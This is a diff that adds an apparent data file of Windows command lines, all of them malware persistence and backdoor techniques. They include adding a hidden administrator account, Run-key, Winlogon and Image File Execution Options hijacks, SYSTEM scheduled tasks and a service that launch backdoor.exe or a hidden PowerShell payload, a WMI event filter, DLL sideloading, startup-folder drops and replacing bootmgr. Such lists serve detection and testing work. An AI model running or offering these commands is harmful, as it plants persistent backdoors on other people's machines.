@@ -1,0 +1,22 @@
+commandline
+net user backdooruser BackdoorPass123! /add
+net localgroup administrators backdooruser /add
+"net localgroup ""remote desktop users"" backdooruser /add"
+"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Run"" /v Backdoor /t REG_SZ /d ""C:\ProgramData\backdoor.exe"" /f"
+"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v SystemService /t REG_SZ /d ""C:\Windows\system32\svchost.exe"" /f"
+"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v Userinit /t REG_SZ /d ""C:\Windows\system32\userinit.exe,C:\temp\backdoor.exe"" /f"
+"schtasks /create /tn ""WindowsOptimizer"" /tr ""C:\temp\backdoor.exe"" /sc daily /st 02:00 /ru ""SYSTEM"""
+"schtasks /create /tn ""SecurityScan"" /tr ""powershell -WindowStyle Hidden -Exec Bypass -File C:\temp\payload.ps1"" /sc onstart /ru ""SYSTEM"""
+"sc create BackdoorService binPath= ""C:\temp\backdoor.exe"" start= auto"
+sc config BackdoorService start= auto
+sc start BackdoorService
+"wmic /Namespace:(root\Subscription) PATH __EventFilter CREATE Name=""Updater"", EventNameSpace=""root\cimv2"", QueryLanguage=""WQL"", Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 320"""
+"copy malicious.dll ""C:\Program Files\LegitimateApp\"""
+"copy legitimate.exe ""C:\Program Files\LegitimateApp\legitimate.exe"""
+"copy backdoor.exe ""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"""
+"copy payload.lnk ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"""
+"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"" /v Debugger /t REG_SZ /d ""C:\temp\backdoor.exe"" /f"
+bootrec /fixmbr
+bootrec /fixboot
+attrib -h -r -s C:\bootmgr
+copy malicious_bootmgr C:\bootmgr
